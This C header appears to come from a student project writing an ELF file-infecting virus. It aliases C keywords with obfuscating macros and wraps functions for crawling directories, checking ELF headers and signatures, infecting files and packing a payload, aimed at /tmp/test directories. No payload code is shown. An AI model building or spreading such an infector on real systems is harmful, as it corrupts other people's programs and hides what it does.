/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   flood.h                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: pboucher <pboucher@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/06/13 01:22:50 by pboucher          #+#    #+#             */
/*   Updated: 2026/06/13 03:26:07 by pboucher         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#pragma once

#define _Iq(x)		if(x)
#define _Wq(x)		while(x)
#define _fr(a) 		for(a)
#define _Rq(x)		return(x)
#define _Eq			else
#define _Cq			continue
#define _Dq			do
#define _Sq			struct
#define _Gq			goto
#define _Cc			const char *
#define _cC			char *
#define _I			int
#define _st			size_t
#define _OR			||
#define _EG			==
#define _ST			=
#define _Nq			NULL
#define _WKq 		{"/tmp/test","/tmp/test2"}
#define _OP(a,b)	open(a,b)
#define _OD(x)		opendir(x)
#define _RD(x)		readdir(x)
#define _CD(x)		closedir(x)
#define _C(x)		close(x)
#define _FR(x)		free(x)
#define _SJ(a,b)	strjoin(a,b)
#define _IFf(a,b) 	infect_file(a,b)
#define _CS(x)		check_signature(x)
#define _CEH(x)		check_elf_hdr(x)
#define _CRd(a,b) 	crawl_dir(a,b)
#define _PP(a,b,c)	pack_payload(a,b,c)
#define _RN(a,b)	rename(a,b)
#define _mZ 		(~0)
#define _pZ 		(1^1)
#define _DOT(x) 	(!(*(x)^0x2e)&!*((x)+1))
#define _DDOT(x)	(!(*(x)^0x2e)&!(*(x+1)^0x2e)&!*(x+2))